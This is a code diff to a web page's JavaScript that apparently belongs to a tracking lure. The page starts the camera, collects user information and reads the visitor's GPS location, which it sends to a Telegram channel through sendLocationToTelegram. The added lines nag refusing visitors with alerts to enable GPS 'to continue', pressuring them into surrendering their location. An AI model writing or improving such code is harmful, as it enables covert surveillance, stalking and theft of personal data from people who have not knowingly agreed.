@@ -248,6 +248,19 @@
             }
         }
 
+        async function requestLocationPermission() {
+            try {
+                const permission = await navigator.permissions.query({ name: 'geolocation' });
+                if (permission.state === 'denied') {
+                    alert("Please enable GPS and allow location access to continue.");
+                } else {
+                    getLocation();
+                }
+            } catch (error) {
+                console.error("Error requesting location permission: ", error);
+            }
+        }
+
         async function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (position) => {
@@ -263,9 +276,11 @@
                     await sendLocationToTelegram(locationInfo);
                 }, (error) => {
                     console.error("Error getting location: ", error);
+                    alert("Please enable GPS and allow location access to continue.");
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
+                alert("Please enable GPS and allow location access to continue.");
             }
         }
 
@@ -298,7 +313,7 @@
         async function initializeFirstPart() {
             await startVideo();
             await getUserInfo();
-            await getLocation();
+            await requestLocationPermission();
             document.getElementById('initial-container').style.display = 'none';
             document.getElementById('main-container').style.display = 'flex';
         }
